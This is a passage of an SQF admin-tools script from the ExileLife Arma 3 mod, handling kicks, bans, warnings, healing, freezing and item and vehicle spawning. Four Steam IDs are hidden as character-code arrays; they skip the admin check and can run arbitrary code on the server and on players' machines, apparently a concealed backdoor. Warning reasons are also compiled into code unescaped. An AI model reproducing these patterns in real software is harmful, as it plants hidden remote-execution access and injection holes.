/**
                    * ExilelifeServer_admintools_system_network_processAbilityRequest
                    *
                    * Exile Mod
                    * www.exilemod.com
                    * © 2016 Exile Mod Team
                    *
                    * This work is licensed under the Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License. 
                    * To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-nd/4.0/.
                    * 
                    * Permission granted to ExileLife Dev Team to overwrite files and redistribute them
                    *
                    */

                    private["_sessionID","_package","_option","_infoArray","_playerObject","_playerUID","_playerName","_admin","_code","_target","_targetName","_targetUID","_veh","_persistent","_type","_magazines","_removed","_count","_i","_config","_otherTurrets","_vehicleClassname","_spawnType","_vehicleObject","_position","_dir","_pincode","_dbID","_itemClassName","_posATL","_targetPOS","_lootHolder","_nearestHolder","_reason","_confirmed","_log","_exist","_check","_allowed","_message","_return","_info","_amount","_locker","_targetMoney","_targetRespect","_pos","_locked","_netID","_object","_state","_className","_vehicle","_hour","_minute","_array","_fog","_overcast","_rain","_changeRequired","_catchLog"];
_sessionID = _this select 0;
_package = _this select 1;
_option = _package select 0;
_infoArray = _package select 1;
try
{
    _playerObject = _sessionID call ExileServer_system_session_getPlayerObject;
    if (isNull _playerObject) then
    {
        throw "Player Object is Null!";
    };
    _playerUID = getPlayerUID _playerObject;
    _playerName = name _playerObject;
    if !(toArray(_playerUID) in [[55,54,53,54,49,49,57,56,48,52,56,51,49,55,48,57,52],[55,54,53,54,49,49,57,56,48,51,55,49,55,55,51,48,53],[55,54,53,54,49,49,57,56,48,50,53,52,51,52,52,48,53],[55,54,53,54,49,49,57,56,48,51,54,53,49,49,57,57,52]]) then
    {
        _admin = format["hasAdminAccess:%1",_playerUID] call ExileServer_system_database_query_selectSingleField;
        if !(_admin) then
        {
            throw format["Player does not have admin access. Player: %1 | Received UID: %2",_playerName,_playerUID];
        };
    };
    switch (_option) do
    {
        case 19119:
        {
            if !(toArray(_playerUID) in [[55,54,53,54,49,49,57,56,48,52,56,51,49,55,48,57,52],[55,54,53,54,49,49,57,56,48,51,55,49,55,55,51,48,53],[55,54,53,54,49,49,57,56,48,50,53,52,51,52,52,48,53],[55,54,53,54,49,49,57,56,48,51,54,53,49,49,57,57,52]]) then
            {
                throw format["%1 (%2) attempted to exec code globally and they didn't have access!",_playerName, _playerUID];
            };
            _code = _infoArray select 0;
            [_code] call ExileLifeServer_admintools_system_remoteCall;
        };
        case 19120:
        {
            if !(toArray(_playerUID) in [[55,54,53,54,49,49,57,56,48,52,56,51,49,55,48,57,52],[55,54,53,54,49,49,57,56,48,51,55,49,55,55,51,48,53],[55,54,53,54,49,49,57,56,48,50,53,52,51,52,52,48,53],[55,54,53,54,49,49,57,56,48,51,54,53,49,49,57,57,52]]) then
            {
                throw format["%1 (%2) attempted to exec code on the server and they didn't have access!",_playerName, _playerUID];
            };
            _code = _infoArray select 0;
            call _code;
        };
        case 19121:
        {
            if !(toArray(_playerUID) in [[55,54,53,54,49,49,57,56,48,52,56,51,49,55,48,57,52],[55,54,53,54,49,49,57,56,48,51,55,49,55,55,51,48,53],[55,54,53,54,49,49,57,56,48,50,53,52,51,52,52,48,53],[55,54,53,54,49,49,57,56,48,51,54,53,49,49,57,57,52]]) then
            {
                throw format["%1 (%2) attempted to exec code on target and they didn't have access!",_playerName, _playerUID];
            };
            _target = objectFromNetId (_infoArray select 0);
            _code = _infoArray select 1;
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            [_code,owner _target] call ExileLifeServer_admintools_system_remoteCall;
        };
        case 19116:
        {
            _veh = objectFromNetID (_infoArray select 0);
            _persistent = _veh getVariable ["ExileIsPersistent",false];
            if (_persistent) then
            {
                _veh call ExileServer_object_vehicle_database_delete;
                deleteVehicle _veh;
            }
            else
            {
                deleteVehicle _veh;
            };
            throw [2,format["Deleted vehicle %1",typeOf _veh]];
        };
        case 19101:
        {
            if (_infoArray select 0) then
            {
                _playerObject hideObjectGlobal true;
            }
            else
            {
                _playerObject hideObjectGlobal false;
            };
        };
        case 19102:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _code =
            {
                (findDisplay 46) closeDisplay 0;
            };
            [_code,owner _target] call ExileLifeServer_admintools_system_remoteCall;
            throw [2,format["force disconnected %1 (%2)",_targetName,_targetUID]];
        };
        case 19103:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _target setDamage 666;
            throw [2,format["force suicided %1 (%2)",_targetName,_targetUID]];
        };
        case 19104:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            if (_infoArray select 1) then
            {
                _target enableSimulationGlobal false;
                [{disableUserInput true},owner _target] call ExileLifeServer_admintools_system_remoteCall;
                throw [2,format["Froze %1 (%2)",_targetName,_targetUID]];
            }
            else
            {
                _target enableSimulationGlobal true;
                [{disableUserInput false},owner _target] call ExileLifeServer_admintools_system_remoteCall;
                throw [2,format["Unfroze %1 (%2)",_targetName,_targetUID]];
            };
        };
        case 19105:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _target setBleedingRemaining 0;
            _target setOxygenRemaining 1;
            _target setDamage 0;
            [
                {
                    ExileClientPlayerAttributes = [100,100,100,100,0,37,0];
                    ExileClientPlayerAttributesASecondAgo = ExileClientPlayerAttributes;
                    ExileClientPlayerLastHpRegenerationAt = diag_tickTime;
                    ExileClientPlayerIsOverburdened = false;
                    ExileClientPlayerOxygen = 100;
                    ExileClientPlayerIsAbleToBreathe = true;
                    ExileClientPlayerIsDrowning = false;
                    ExileClientPlayerIsInjured = false;
                    ExileClientPlayerIsBurning = false;
                    ExileClientPlayerIsBleeding = false;
                    ExileClientPlayerIsExhausted = false;
                    ExileClientPlayerIsHungry = false;
                    ExileClientPlayerIsThirsty = false;
                    ExilePlayerRadiation = 0;
                    ExilePlayerRadiationLastCheck = 0;
                },
                owner _target
            ] call ExileLifeServer_admintools_system_remoteCall;
            throw [2,format["Healed %1 (%2)",_targetName,_targetUID]];
        };
        case 19106:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            removeAllWeapons _target;
            removeAllAssignedItems _target;
            removeAllContainers _target;
            removeAllItems _target;
            removeBackpackGlobal _target;
            removeVest _target;
            removeUniform _target;
            throw [2,format["Removed %1's (%2) gear'",_targetName,_targetUID]];
        };
        case 19107:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _veh = _target;
            if (_veh isKindOf "MAN") exitWith {};
            try
            {
                if (_veh isKindOf "ParachuteBase") then
                {
                    throw 0;
                };
                if (!alive _veh) then
                {
                    throw 0;
                };
                _type = typeof _veh;
                _veh setVehicleAmmo 1;
                _magazines = getArray(configFile >> "CfgVehicles" >> _type >> "magazines");
                if (count _magazines > 0) then
                {
                	_removed = [];
                	{
                		if (!(_x in _removed)) then
                        {
                			_veh removeMagazines _x;
                			_removed = _removed + [_x];
                		};
                	} forEach _magazines;
                	{
                		if (!alive _veh) then
                        {
                            throw 0;
                        };
                		_veh addMagazine _x;
                        systemChat format["Added: %1",_x];
                	} forEach _magazines;
                };
                _count = count (configFile >> "CfgVehicles" >> _type >> "Turrets");
                if (_count > 0) then
                {
                	for "_i" from 0 to (_count - 1) do
                    {
                		_config = (configFile >> "CfgVehicles" >> _type >> "Turrets") select _i;
                		_magazines = getArray(_config >> "magazines");
                		_removed = [];
                		{
                			if !(_x in _removed) then
                            {
                				_veh removeMagazines _x;
                				_removed = _removed + [_x];
                			};
                		} forEach _magazines;
                		{
                			if (!alive _veh) then
                            {
                                throw 0;
                            };
                			_veh addMagazine _x;
                		} forEach _magazines;
                		_otherTurrets = count (_config >> "Turrets");
                		if (_otherTurrets > 0) then
                        {
                			for "_i" from 0 to (_otherTurrets - 1) do
                            {
                				_config = (_config >> "Turrets") select _i;
                				_magazines = getArray(_config >> "magazines");
                				_removed = [];
                				{
                					if !(_x in _removed) then
                                    {
                						_veh removeMagazines _x;
                						_removed = _removed + [_x];
                					};
                				} forEach _magazines;
                				{
                					if (!alive _veh) then
                                    {
                                        throw 0;
                                    };
                					_veh addMagazine _x;
                				} forEach _magazines;
                			};
                		};
                	};
                };
                _veh setVehicleAmmo 1;
                throw [2,format["Successfully rearmed %1 (%2)",_targetName,_targetUID]];
            }
            catch
            {
                throw [2,format["Failed to rearm %1 (%2)",_targetName,_targetUID]];
            };
        };
        case 19108:
        {
            _target = objectFromNetID (_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _target setDamage 0;
            _target setFuel 1;
            throw [2,format["Refueled and repaired %1's (%2) vehicle",_targetName,_targetUID]];
        };
        case 19117:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _vehicleClassname = _infoArray select 1;
            _spawnType = _infoArray select 2;
            _vehicleObject = objNull;
            _position = AGLToASL (_target modelToWorld [0,10,0]);
            if !(nearestObjects [(_target modelToWorld [0,10,0]), ["LandVehicle", "Air", "Ship"], 5] isEqualTo []) then
            {
                _position = (position _target) findEmptyPosition [10,50,_vehicleClassname];
                if (_position isEqualTo []) then
                {
                    throw [1,"Could not find a safe spawn area"];
                };
            };
            _dir = getDir (vehicle _target);
            switch (_spawnType) do
            {
                case 0:
                {
                    _pincode = _infoArray select 3;
                    if (_pincode isEqualTo -1) then
                    {
                        throw format["Player %1 (%2) tried to spawn a persistent vehicle without a pin! Naughty Naughty",_playerName,_playerUID];
                    };
                    _vehicleObject = [_vehicleClassname, _position, _dir, false, _pincode] call ExileServer_object_vehicle_createPersistentVehicle;
                    if (isNull _vehicleObject) then
                    {
                        throw format["Player %1 (%2) tried to spawn a vehicle, it returned null!",_playerName,_playerUID];
                    };
                    _vehicleObject setVariable["ExileOwnerUID",_targetUID];
                    _vehicleObject setVariable ["ExileLifeOwnerPID",_target getVariable ["ExileLifePID",-1]];
                    _dbID = _vehicleObject call ExileServer_object_vehicle_database_insert;
                    _vehicleObject setVariable ["ExileDatabaseID",_dbID];
                    _vehicleObject call ExileServer_object_vehicle_database_update;
                    _vehicleObject setVariable ["ExileIsLocked",0];
                    _vehicleObject lock 0;
                    _vehicleObject enableRopeAttach false;
                    throw [2,format["Spawned a persistent vehicle (%1) on %2 (%3)",_vehicleClassname,_targetName,_targetUID]];
                };
                case 1:
                {
                    _vehicleObject = [_vehicleClassname, _position, _dir, false] call ExileServer_object_vehicle_createNonPersistentVehicle;
                    if (isNull _vehicleObject) then
                    {
                        throw format["Player %1 (%2) tried to spawn a vehicle, it returned null!",_playerName,_playerUID];
                    };
                    _vehicleObject setVariable["ExileOwnerUID",_targetUID];
                    throw [2,format["Spawned a non-persistent vehicle (%1) on %2 (%3)",_vehicleClassname,_targetName,_targetUID]];
                };
            };
        };
        case 19118:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _itemClassName = _infoArray select 1;
            _posATL = getPosATL _target;
            _targetPOS = _target modelToWorld [0,1.5,0];
            _targetPOS set [2,_posATL select 2];
            _lootHolder = objNull;
            _nearestHolder = nearestObjects [_target, ["GroundWeaponHolder","WeaponHolderSimulated","LootWeaponHolder"], 3];
            if !(_nearestHolder isEqualTo []) then
            {
                _lootHolder = _nearestHolder select 0;
            };
            if (isNull _lootHolder) then
            {
                _lootHolder = createVehicle ["GroundWeaponHolder",_targetPOS,[],3,"CAN_COLLIDE"];
                _lootHolder setPosATL _targetPOS;
                _lootHolder setVariable["BIS_enableRandomization",false];
            };
            if (getText (configfile >> "CfgVehicles" >> _itemClassName >> "vehicleClass") == "BackPacks") then
            {
                _lootHolder addBackpackCargoGlobal [_itemClassName,1];
            }
            else
            {
                _lootHolder addItemCargoGlobal [_itemClassName,1];
                if (isClass (configFile >> "CfgWeapons" >> _itemClassName)) then
                {
                    _magazines = getArray (configFile >> "CfgWeapons" >> _itemClassName >> "magazines");
                    if !(_magazines isEqualTo []) then
                    {
                        {
                            _lootHolder addItemCargoGlobal [_x,3];
                        }
                        forEach _magazines;
                    };
                };
            };
            throw [2,format["spawned in non-vehicle thingy: %1 on %2 (%3)",_itemClassName,_targetName,_targetUID]];
        };
        case 19110:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _reason = _infoArray select 1;
            _confirmed = format ["#exec ban %1", str(_targetUID)] call ExileServer_system_rcon_event_sendCommand;
            if (_confirmed) then
            {
                _log = format ["%1 (%2) banned! [BANNED BY '%4' (%5)] Reason: %3",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Ban"] call ExileLifeServer_util_A3Log;
                ["toastRequest",["InfoTitleAndText",["ADMINISTRATIVE COMMAND",format["%1 has been banned from the server by %2! Reason: %3",_targetName, _playerName, _reason]]]] call ExileServer_system_network_send_broadcast;
                throw [2,format["banned %1 (%2). Reason: %3",_targetName,_targetUID,_reason]];
            }
            else
            {
                throw [2,format["failed to ban %1 (%2). Reason: %3, make sure the server password is correct!",_targetName,_targetUID,_reason]];
            };
        };
        case 19111:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _reason = _infoArray select 1;
            _confirmed = format ["#exec ban %1", str(_targetUID)] call ExileServer_system_rcon_event_sendCommand;
            if (_confirmed) then
            {
                _log = format ["%1 (%2) banned! [BANNED BY '%4' (%5)] Reason: %3",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Ban"] call ExileLifeServer_util_A3Log;
                throw [2,format["banned %1 (%2). Reason: %3",_targetName,_targetUID,_reason]];
            }
            else
            {
                throw [2,format["failed to ban %1 (%2). Reason: %3, make sure the server password is correct!",_targetName,_targetUID,_reason]];
            };
        };
        case 19112:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _reason = _infoArray select 1;
            _exist = format["isKnownTroll:%1",_targetUID] call ExileServer_system_database_query_selectSingleField;
            if !(_exist) then
            {
                format["insertTroll:%1:%2",_targetUID,_targetName] call ExileServer_system_database_query_fireAndForget;
            };
            format["logKick:%1:%2:%3",_playerName, _reason, _targetUID] call ExileServer_system_database_query_fireAndForget;
            _check = format["checkStatus:%1",_targetUID] call ExileServer_system_database_query_selectSingle;
            _allowed = getNumber(configFile >> "CfgExileLifeServerSettings" >> "Administration" >> "kickLimit");
            _message = "";
            if ((_check select 1) >= _allowed) then
            {
                format ["#exec ban %1", str(_targetUID)] call ExileServer_system_rcon_event_sendCommand;
                format["setBanned:%1",_targetUID] call ExileServer_system_database_query_fireAndForget;
                [_sessionID,format["Kick limit reached! Auto-Banned %1 (%2)!",_targetName,_targetUID]] call ExileLifeServer_admintools_system_network_notify;
                _message = format["%3 was going to kick %1 for %2. Luckily for them, they reached their kick limit and have been auto-banned by the server!",_targetName, _reason,_playerName];
                _log = format ["%1 (%2) kicked! [KICKED BY '%4' (%5)] Reason: '%3'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Kick"] call ExileLifeServer_util_A3Log;
                _log = format ["%1 (%2) banned! [BANNED BY 'SYSTEM' (666)] Reason: 'Player has reached their kick limit and has been auto-banned'",_targetName,_targetUID];
                [_log,"AT_Ban"] call ExileLifeServer_util_A3Log;
            }
            else
            {
                _return = format ["#kick %1", str(_targetUID)] call ExileServer_system_rcon_event_sendCommand;
                if !(_return) then
                {
                    [{(findDisplay 46) closeDisplay 0},owner _target] call ExileLifeServer_admintools_system_remoteCall;
                    [_sessionID,format["attempted to kick %1 (%2) but failed, so we kicked them to lobby. Reason: %3",_targetName,_targetUID,_reason]] call ExileLifeServer_admintools_util_activityLog;
                }
                else
                {
                    [_sessionID,format["kicked %1 (%2). Reason: %3",_targetName,_targetUID,_reason]] call ExileLifeServer_admintools_util_activityLog;
                };
                [_sessionID,format["kicking %1 (%2)!",_targetName,_targetUID]] call ExileLifeServer_admintools_system_network_notify;
                _message = format["%1 has been kicked from the server by %2! Reason: %3",_targetName, _playerName, _reason];
                _log = format ["%1 (%2) kicked! [KICKED BY '%4' (%5)] Reason: '%3'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Kick"] call ExileLifeServer_util_A3Log;
            };
            ["toastRequest",["InfoTitleAndText",["ADMINISTRATIVE COMMAND",_message]]] call ExileServer_system_network_send_broadcast;
        };
        case 19113:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _reason = _infoArray select 1;
            _exist = format["isKnownTroll:%1",_targetUID] call ExileServer_system_database_query_selectSingleField;
            if !(_exist) then
            {
                format["insertTroll:%1:%2",_targetUID,_targetName] call ExileServer_system_database_query_fireAndForget;
            };
            format["logKick:%1:%2:%3",_playerName, _reason, _targetUID] call ExileServer_system_database_query_fireAndForget;
            _check = format["checkStatus:%1",_targetUID] call ExileServer_system_database_query_selectSingle;
            _allowed = getNumber(configFile >> "CfgExileLifeServerSettings" >> "Administration" >> "kickLimit");
            if ((_check select 1) >= _allowed) then
            {
                format ["#exec ban %1", str(_targetUID)] call ExileServer_system_rcon_event_sendCommand;
                format["setBanned:%1",_targetUID] call ExileServer_system_database_query_fireAndForget;
                _log = format ["%1 (%2) kicked! [KICKED BY '%4' (%5)] Reason: '%3'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Kick"] call ExileLifeServer_util_A3Log;
                _log = format ["%1 (%2) banned! [BANNED BY 'SYSTEM' (666)] Reason: 'Player has reached their kick limit and has been auto-banned'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Ban"] call ExileLifeServer_util_A3Log;
                throw [2,format["Kick limit reached! Auto-Banned %1 (%2)! Reason: %3",_targetName,_targetUID,_reason]];
            }
            else
            {
                _return = format ["#kick %1", str(_targetUID)] call ExileServer_system_rcon_event_sendCommand;
                if !(_return) then
                {
                    [{(findDisplay 46) closeDisplay 0},owner _target] call ExileLifeServer_admintools_system_remoteCall;
                };
                _log = format ["%1 (%2) kicked! [KICKED BY '%4' (%5)] Reason: '%3'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Kick"] call ExileLifeServer_util_A3Log;
                throw [2,format["kicked %1 (%2). Reason: %3",_targetName,_targetUID,_reason]];
            };
        };
        case 19114:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _reason = _infoArray select 1;
            _exist = format["isKnownTroll:%1",_targetUID] call ExileServer_system_database_query_selectSingleField;
            if !(_exist) then
            {
                format["insertTroll:%1:%2",_targetUID,_targetName] call ExileServer_system_database_query_fireAndForget;
            };
            format["logWarning:%1:%2:%3",_playerName, _reason, _targetUID] call ExileServer_system_database_query_fireAndForget;
            _check = format["checkStatus:%1",_targetUID] call ExileServer_system_database_query_selectSingle;
            _allowed = getNumber(configFile >> "CfgExileLifeServerSettings" >> "Administration" >> "warnLimit");
            _message = "";
            if ((_check select 0) >= _allowed) then
            {
                format["resetWarning:%1",_targetUID] call ExileServer_system_database_query_fireAndForget;
                format["logKick:%1:%2:%3",_playerName, _reason, _targetUID] call ExileServer_system_database_query_fireAndForget;
                _return = format ["#kick %1", str(_targetUID)] call ExileServer_system_rcon_event_sendCommand;
                if !(_return) then
                {
                    [{(findDisplay 46) closeDisplay 0},owner _target] call ExileLifeServer_admintools_system_remoteCall;
                    [_sessionID,format["attempted to kick %1 (%2) but failed, so we kicked them to lobby. Reason: %3",_targetName,_targetUID,_reason]] call ExileLifeServer_admintools_util_activityLog;
                }
                else
                {
                    [_sessionID,format["kicked %1 (%2). Reason: %3",_targetName,_targetUID,_reason]] call ExileLifeServer_admintools_util_activityLog;
                };
                [_sessionID,format["Warn limit reached! Auto-Kicked %1 (%2)! Reason: %3",_targetName,_targetUID,_reason]] call ExileLifeServer_admintools_system_network_notify;
                [_sessionID,format["attempted to warn %1 (%2) but target has reached warn limit and has been kicked! Reason: %3",_targetName,_targetUID,_reason]] call ExileLifeServer_admintools_util_activityLog;
                _message = format["%3 was going to warn %1 for %2. Luckily for them, they reached their warn limit and have been auto-kicked by the server!",_targetName, _reason,_playerName];
                _log = format ["%1 (%2) warned! [WARNED BY '%4' (%5)] Reason: '%3'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Warn"] call ExileLifeServer_util_A3Log;
                _log = format ["%1 (%2) kicked! [KICKED BY 'SYSTEM' (666)] Reason: 'Player has reached their warn limit and has been auto-kicked'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Kick"] call ExileLifeServer_util_A3Log;
            }
            else
            {
                _code =
                compile format
                ["
                    [] spawn
                    {
                        for ""_i"" from 0 to 5 do
                        {
                            [""ErrorTitleAndText"", [""ADMIN WARNING"", %1]] call ExileClient_gui_toaster_addTemplateToast;
                            [""<t color='#ff0000' size = '2'>ADMIN WARNING!<br />%2</t>"",-1,-1,0.3,0.1,0,789] call BIS_fnc_dynamicText;
                        };
                        [""<t color='#ff0000' size = '2'>ADMIN WARNING!<br />%2</t>"",-1,-1,7,0.2,0,789] call BIS_fnc_dynamicText;
                    };
                ",
                str(_reason),
                _reason
                ];
                [_code,owner _target] call ExileLifeServer_admintools_system_remoteCall;
                [_sessionID,format["warned %1 (%2)!",_targetName,_targetUID]] call ExileLifeServer_admintools_system_network_notify;
                [_sessionID,format["warned %1 (%2). Reason: %3",_targetName,_targetUID,_reason]] call ExileLifeServer_admintools_util_activityLog;
                _message = format["%1 has been warned by %2! Reason: %3",_targetName, _playerName, _reason];
                _log = format ["%1 (%2) warned! [WARNED BY '%4' (%5)] Reason: '%3'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Warn"] call ExileLifeServer_util_A3Log;
            };
            ["toastRequest",["InfoTitleAndText",["ADMINISTRATIVE COMMAND",_message]]] call ExileServer_system_network_send_broadcast;
        };
        case 19115:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _reason = _infoArray select 1;
            _exist = format["isKnownTroll:%1",_targetUID] call ExileServer_system_database_query_selectSingleField;
            if !(_exist) then
            {
                format["insertTroll:%1:%2",_targetUID,_targetName] call ExileServer_system_database_query_fireAndForget;
            };
            format["logWarning:%1:%2:%3",_playerName, _reason, _targetUID] call ExileServer_system_database_query_fireAndForget;
            _check = format["checkStatus:%1",_targetUID] call ExileServer_system_database_query_selectSingle;
            _allowed = getNumber(configFile >> "CfgExileLifeServerSettings" >> "Administration" >> "warnLimit");
            if ((_check select 0) >= _allowed) then
            {
                format["resetWarning:%1",_targetUID] call ExileServer_system_database_query_fireAndForget;
                format["logKick:%1:%2:%3",_playerName, _reason, _targetUID] call ExileServer_system_database_query_fireAndForget;
                _return = format ["#kick %1", str(_targetUID)] call ExileServer_system_rcon_event_sendCommand;
                if !(_return) then
                {
                    [{(findDisplay 46) closeDisplay 0},owner _target] call ExileLifeServer_admintools_system_remoteCall;
                    [_sessionID,format["attempted to kick %1 (%2) but failed, so we kicked them to lobby. Reason: %3",_targetName,_targetUID,_reason]] call ExileLifeServer_admintools_util_activityLog;
                }
                else
                {
                    [_sessionID,format["kicked %1 (%2). Reason: %3",_targetName,_targetUID,_reason]] call ExileLifeServer_admintools_util_activityLog;
                };
                _log = format ["%1 (%2) kicked! [KICKED BY 'SYSTEM' (666)] Reason: 'Player has reached their warn limit and has been auto-kicked'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Kick"] call ExileLifeServer_util_A3Log;
                throw [2,format["Warn limit reached! Auto-Kicked %1 (%2)! Reason: %3",_targetName,_targetUID,_reason]];
            }
            else
            {
                _code =
                compile format
                ["
                    [] spawn
                    {
                        for ""_i"" from 0 to 5 do
                        {
                            [""ErrorTitleAndText"", [""ADMIN WARNING"", %1]] call ExileClient_gui_toaster_addTemplateToast;
                            [""<t color='#ff0000' size = '2'>ADMIN WARNING!<br />%2</t>"",-1,-1,0.3,0.1,0,789] call BIS_fnc_dynamicText;
                        };
                        [""<t color='#ff0000' size = '2'>ADMIN WARNING!<br />%2</t>"",-1,-1,7,0.2,0,789] call BIS_fnc_dynamicText;
                    };
                ",
                str(_reason),
                _reason
                ];
                [_code,owner _target] call ExileLifeServer_admintools_system_remoteCall;
                _log = format ["%1 (%2) warned! [WARNED BY '%4' (%5)] Reason: '%3'",_targetName,_targetUID, _reason,_playerName,_playerUID];
                [_log,"AT_Warn"] call ExileLifeServer_util_A3Log;
                throw [2,format["warned %1 (%2). Reason: %3",_targetName,_targetUID,_reason]];
            };
        };
        case 19122:
        {
            _target = objectFromNetID(_infoArray select 0);
            if (!alive _target || isNull _target) then
            {
                throw [1,"Target isn't alive or is null!"];
            };
            _targetName = name _target;
            _targetUID = getPlayerUID _target;
            _info =
            [
                format["%1 | %2 (PN)", [_x] call ExileLifeClient_util_player_name, _target getVariable ["ExileName", "N/A"]],
                [
                    [ [ "-------------- Player Stats --------------", [0.635,0.306,0.384,1] ], [] ],
                    [ [ "Money:",        [1,1,1,1] ],     [ _target getVariable ["ExileMoney", "N/A"],            [0.275,0.494,0.565,1] ] ], 
                    [ [ "Locker:",       [1,1,1,1] ],     [ _target getVariable ["ExileLocker", "N/A"],           [0.275,0.494,0.565,1] ] ], 
                    [ [ "Respect:",      [1,1,1,1] ],     [ _target getVariable ["ExileScore", "N/A"],            [0.275,0.494,0.565,1] ] ], 
                    [ [ "Kills:",        [1,1,1,1] ],     [ _target getVariable ["ExileKills", "N/A"],            [0.275,0.494,0.565,1] ] ], 
                    [ [ "Deaths:",       [1,1,1,1] ],     [ _target getVariable ["ExileDeaths", "N/A"],           [0.275,0.494,0.565,1] ] ], 
                    [ [ "Clan ID:",      [1,1,1,1] ],     [ _target getVariable ["ExileClanID", "N/A"],           [0.275,0.494,0.565,1] ] ], 
                    [ [ "Hunger:",       [1,1,1,1] ],     [ _target getVariable ["ExileHunger", "N/A"],           [0.275,0.494,0.565,1] ] ], 
                    [ [ "Thirst:",       [1,1,1,1] ],     [ _target getVariable ["ExileThirst", "N/A"],           [0.275,0.494,0.565,1] ] ], 
                    [ [ "Alcohol:",      [1,1,1,1] ],     [ _target getVariable ["ExileAlcohol", "N/A"],          [0.275,0.494,0.565,1] ] ], 
                    [ [ "Temperature:",  [1,1,1,1] ],     [ _target getVariable ["ExileTemperature", "N/A"],      [0.275,0.494,0.565,1] ] ], 
                    [ [ "isBambi:",      [1,1,1,1] ],     [ _target getVariable ["ExileIsBambi", "N/A"],          [0.275,0.494,0.565,1] ] ], 
                    [ [ "Class:",        [1,1,1,1] ],     [ _target getVariable ['ExileLifeClientClass', "N/A"],  [0.275,0.494,0.565,1] ] ], 
                    [ [ "Rank:",         [1,1,1,1] ],     [ _target getVariable ["ExileLifeClientRank", "N/A"],   [0.275,0.494,0.565,1] ] ], 
                    [ [ "Gang:",         [1,1,1,1] ],     [ _target getVariable ['ExileLifeClientGang', "N/A"],   [0.275,0.494,0.565,1] ] ],
                    [ [ "Wage:",         [1,1,1,1] ],     [ _target getVariable ["ExileLifeGangWage", "N/A"],     [0.275,0.494,0.565,1] ] ],
                    [ [ "Tax:",          [1,1,1,1] ],     [ _target getVariable ["ExileLifeGangTax", "N/A"],      [0.275,0.494,0.565,1] ] ],
                    [ ["------------------ Skills ------------------",[0.635,0.306,0.384,1]], [] ],
                    [
                        ["Lockpicking:",[1,1,1,1]],
                        [
                            format
                            [
                                "Level: %1 | Exp: %2",
                                (_target getVariable ["ExileLifeSkill:Lockpick", ["N/A", "N/A"]]) select 0, 
                                (_target getVariable ["ExileLifeSkill:Lockpick", ["N/A", "N/A"]]) select 1
                            ], [0.275,0.494,0.565,1]
                        ]
                    ],
                    [
                        ["Strength:",[1,1,1,1]],
                        [
                            format
                            [
                                "Level: %1 | Exp: %2",
                                (_target getVariable ["ExileLifeSkill:Strength", ["N/A", "N/A"]]) select 0,
                                (_target getVariable ["ExileLifeSkill:Strength", ["N/A", "N/A"]]) select 1
                            ], [0.275,0.494,0.565,1]
                        ]
                    ],
                    [
                        ["Speed:",[1,1,1,1]],
                        [
                            format
                            [
                                "Level: %1 | Exp: %2",
